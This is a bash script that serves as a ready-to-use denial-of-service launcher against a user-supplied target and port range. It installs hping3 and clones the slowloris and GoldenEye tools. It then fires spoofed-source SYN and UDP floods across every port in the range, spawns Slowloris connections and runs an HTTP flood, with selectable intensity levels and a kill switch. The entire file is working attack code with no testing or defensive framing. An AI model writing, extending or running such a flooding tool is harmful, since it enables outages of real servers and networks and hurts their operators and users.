#!/bin/bash

set -euo pipefail
IFS=$'\n\t'
clear

# === COLORS ===
GREEN="\033[1;32m"
RED="\033[1;31m"
RESET="\033[0m"

# === GLOBAL VARIABLES ===
HPING_DELAY=""
WORKERS=""
TARGET=""
PORT_START=0
PORT_END=0

# === Intensity Selector ===
set_intensity() {
  echo -e "${GREEN}Choose attack intensity:${RESET}"
  echo "1) Low     (Slow)"
  echo "2) Medium  (Balanced)"
  echo "3) High    (Aggressive)"
  read -p "Select level [1-3]: " LEVEL

  case "$LEVEL" in
    1) HPING_DELAY="u5000"; WORKERS=20 ;;
    2) HPING_DELAY="u2000"; WORKERS=50 ;;
    3) HPING_DELAY="u1000"; WORKERS=100 ;;
    *) echo -e "${RED}[!] Invalid intensity level.${RESET}"; exit 1 ;;
  esac
}

# === Dependency Checker ===
check_dependencies() {
  echo -e "${GREEN}[+] Checking and installing required tools...${RESET}"
  sudo apt update -y &>/dev/null
  sudo apt install -y hping3 python3 git &>/dev/null

  [[ ! -d "slowloris" ]] && git clone https://github.com/gkbrk/slowloris &>/dev/null
  [[ ! -d "GoldenEye" ]] && git clone https://github.com/jseidl/GoldenEye &>/dev/null
}

# === Input Validator ===
validate_input() {
  if [[ -z "$TARGET" ]]; then
    echo -e "${RED}[!] Target cannot be empty.${RESET}"
    exit 1
  fi

  if ! [[ "$PORT_START" =~ ^[0-9]+$ && "$PORT_END" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[!] Invalid port range.${RESET}"
    exit 1
  fi

  if (( PORT_START < 1 || PORT_END > 65535 || PORT_START > PORT_END )); then
    echo -e "${RED}[!] Port range must be between 1 and 65535, and start < end.${RESET}"
    exit 1
  fi
}

# === Attacks ===
attack_syn() {
  echo -e "${GREEN}[SYN Flood] Launching on ports $PORT_START to $PORT_END...${RESET}"
  for ((p=PORT_START; p<=PORT_END; p++)); do
    sudo hping3 -S --flood --rand-source -p "$p" -i "$HPING_DELAY" "$TARGET" &>/dev/null &
  done
}

attack_udp() {
  echo -e "${GREEN}[UDP Flood] Launching on ports $PORT_START to $PORT_END...${RESET}"
  for ((p=PORT_START; p<=PORT_END; p++)); do
    sudo hping3 --udp --flood --rand-source -p "$p" -i "$HPING_DELAY" "$TARGET" &>/dev/null &
  done
}

attack_slowloris() {
  echo -e "${GREEN}[Slowloris] Spawning $WORKERS connections...${RESET}"
  for ((i=0; i<WORKERS; i++)); do
    python3 slowloris/slowloris.py "$TARGET" &>/dev/null &
  done
}

attack_http() {
  echo -e "${GREEN}[GoldenEye] Launching HTTP Flood with $WORKERS threads...${RESET}"
  python3 GoldenEye/goldeneye.py "http://$TARGET" -w "$WORKERS" -s "$WORKERS" &>/dev/null &
}

# === Emergency Stop ===
emergency_stop() {
  echo -e "${GREEN}[!] Press 'q' to stop all attacks immediately.${RESET}"
  while true; do
    read -n1 -s key
    [[ "$key" == "q" ]] && {
      echo -e "\n${RED}[!] Stopping all attacks...${RESET}"
      pkill -f hping3 || true
      pkill -f slowloris.py || true
      pkill -f goldeneye.py || true
      exit 0
    }
  done
}

# === Main ===
main() {
  read -p "🎯 Enter target IP or domain: " TARGET
  read -p "📍 Enter port range (e.g. 80 85): " PORT_START PORT_END

  validate_input
  check_dependencies
  set_intensity

  echo ""
  echo -e "${GREEN}🔥 Select attack types (space-separated):${RESET}"
  echo "1) SYN Flood"
  echo "2) UDP Flood"
  echo "3) Slowloris (HTTP Layer 7)"
  echo "4) HTTP Flood (GoldenEye)"
  read -p "Choose [e.g. 1 3 4]: " ATTACKS

  for ATTACK in $ATTACKS; do
    case "$ATTACK" in
      1) attack_syn ;;
      2) attack_udp ;;
      3) attack_slowloris ;;
      4) attack_http ;;
      *) echo -e "${RED}[!] Invalid attack option: $ATTACK${RESET}" ;;
    esac
  done

  emergency_stop
}

main
